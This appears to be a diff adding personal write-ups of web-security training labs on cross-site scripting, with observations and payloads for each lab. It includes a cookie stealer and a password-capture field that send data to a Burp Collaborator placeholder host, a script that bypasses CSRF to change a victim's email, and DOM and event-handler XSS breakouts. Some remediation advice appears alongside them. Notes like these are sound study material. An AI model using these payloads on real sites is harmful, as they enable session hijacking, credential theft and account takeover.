@@ -366,4 +366,197 @@ Get an alert box.
 - With the filtering and encoding we're running into we can effectively soak up the JS and escape it. 
 ``` \'-alert(1)//```
 
-#
+# Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
+Pop an alert
+## Observations 
+- Encoding:
+```
+<section class="comment">
+    <p>
+        <img src="/resources/images/avatarDefault.svg" class="avatar"> <a id="author" href="http://h39uymrn.com" onclick="var tracker={track(){}};tracker.track('http://h39uymrn.com');">h39uymrn</a> | 07 September 2025
+    </p>
+    <p>Sink test h39uymrn</p>
+    <p></p>
+</section>
+```
+- Payload to get it to work: ``` http://foo?&apos;-alert(1)-&apos; ```
+This makes the body look like:
+```
+<section class="comment">
+    <p>
+    <img src="/resources/images/avatarDefault.svg" class="avatar"> <a id="author" href="http://foo?&apos;-alert(1)-&apos;" onclick="var tracker={track(){}};tracker.track('http://foo?&apos;-alert(1)-&apos;');">Test</a> | 07 September 2025
+    </p>
+    <p>Test</p>
+    <p></p>
+</section>
+```
+This is a context-mismatch bug: user input is inserted into an inline event handler. The server applies HTML entity encoding to quotes, but the browser decodes those entities before the handler is parsed as JavaScript, enabling string breakout and code execution. Fix by removing inline handlers (use addEventListener), or by correctly JS-escaping user data (e.g., via JSON.stringify), and enforce CSP that disallows inline event handlers.
+The HTML parser decodes entities inside attribute values.
+```&apos;``` becomes a literal ```'```.
+The onclick code that the JS engine receives is effectively:
+```
+var tracker = { track(){} };
+tracker.track('http://foo?' - alert(1) - '');
+```
+
+# Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
+Get an alert box.
+## Observations
+```
+<script>
+    var message = `1 search results for 'test'`;
+    document.getElementById('searchMessage').innerText = message;
+</script>
+```
+- Because of all the encoded characters we're limited to template literal interpolation which means that $ { } and ` stil parse and the code will run inside the template. 
+```
+${alert()}
+```
+
+# Exploiting cross-site scripting to steal cookies
+Steal the victim's cookie and then impersonate them. 
+## Observations
+- Probably a stored XSS.
+- The comment field is vulnerable. Simple cookie stealer:
+```
+<script>
+    fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
+    method: 'POST',
+    mode: 'no-cors',
+    body:document.cookie
+    });
+</script>
+```
+Took the session token from the COLLABORATOR and replaced mine to get the Admin's session. 
+
+# Exploiting XSS to bypass CSRF defenses
+Change the email address of another user
+## Observations
+- Can log in as weiner:peter and can see the CSRF token on the email change form. 
+- Need to develop an xss to bypass that CSRF token so that the victim will submit their own token:
+```
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('csrf='+token+'&email=test@test.com')
+};
+</script>
+```
+- The comment field is vulnerable to XSS. 
+- The unusual thing about this lab was that it allowed login and email change and had XSS but most XSS labs here don't have logins 
+
+# Exploiting cross-site scripting to capture passwords
+Steal passwords
+## Observations
+- XSS is in the comments field of the form. 
+- Another XSS challenge that does have a username and password login function but wiener peter doesn't work. 
+- Need to either create and XSS payload to steal creds or CSRF. 
+- Turns out the victim will type username and password into hidden fields which is almost unrealistic outside of maybe a password manager or stored passwords. The page doesn't contain anything that would give the victim a legit reason to type the username or password on this page. 
+```
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+```
+
+# Stored DOM XSS
+Get an alert box
+## Observations
+- Only blog comments. DOM Intruder shows that there are viable sinks. 
+- There's a JS file that is loading the canary. 
+```
+function loadComments(postCommentPath) {
+    let xhr = new XMLHttpRequest();
+    xhr.onreadystatechange = function() {
+        if (this.readyState == 4 && this.status == 200) {
+            let comments = JSON.parse(this.responseText);
+            displayComments(comments);
+        }
+    };
+    xhr.open("GET", postCommentPath + window.location.search);
+    xhr.send();
+
+    function escapeHTML(html) {
+        return html.replace('<', '&lt;').replace('>', '&gt;');
+    }
+
+    function displayComments(comments) {
+        let userComments = document.getElementById("user-comments");
+
+        for (let i = 0; i < comments.length; ++i)
+        {
+            comment = comments[i];
+            let commentSection = document.createElement("section");
+            commentSection.setAttribute("class", "comment");
+
+            let firstPElement = document.createElement("p");
+
+            let avatarImgElement = document.createElement("img");
+            avatarImgElement.setAttribute("class", "avatar");
+            avatarImgElement.setAttribute("src", comment.avatar ? escapeHTML(comment.avatar) : "/resources/images/avatarDefault.svg");
+
+            if (comment.author) {
+                if (comment.website) {
+                    let websiteElement = document.createElement("a");
+                    websiteElement.setAttribute("id", "author");
+                    websiteElement.setAttribute("href", comment.website);
+                    firstPElement.appendChild(websiteElement)
+                }
+
+                let newInnerHtml = firstPElement.innerHTML + escapeHTML(comment.author)
+                firstPElement.innerHTML = newInnerHtml
+            }
+
+            if (comment.date) {
+                let dateObj = new Date(comment.date)
+                let month = '' + (dateObj.getMonth() + 1);
+                let day = '' + dateObj.getDate();
+                let year = dateObj.getFullYear();
+
+                if (month.length < 2)
+                    month = '0' + month;
+                if (day.length < 2)
+                    day = '0' + day;
+
+                dateStr = [day, month, year].join('-');
+
+                let newInnerHtml = firstPElement.innerHTML + " | " + dateStr
+                firstPElement.innerHTML = newInnerHtml
+            }
+
+            firstPElement.appendChild(avatarImgElement);
+
+            commentSection.appendChild(firstPElement);
+
+            if (comment.body) {
+                let commentBodyPElement = document.createElement("p");
+                commentBodyPElement.innerHTML = escapeHTML(comment.body);
+
+                commentSection.appendChild(commentBodyPElement);
+            }
+            commentSection.appendChild(document.createElement("p"));
+
+            userComments.appendChild(commentSection);
+        }
+    }
+};
+```
+The value is in the element.innerHTML:
+```
+<section class="comment"><p><a id="author" href="http://h39uymrn.com"></a>h39uymrn | 06-09-2025<img class="avatar" src="/resources/images/avatarDefault.svg"></p><p>h39uymrn</p><p></p></section>
+```
+- The URL value actually isn't the issue here even though the canary sinks there, it is in how the string encodes angle brackets. It only encodes the first set. So, this payload works:
+```<><img src=1 onerror=alert(1)>```
+
+String.replace only hits once. 
+```
+return html.replace('<', '&lt;').replace('>', '&gt;');
+```
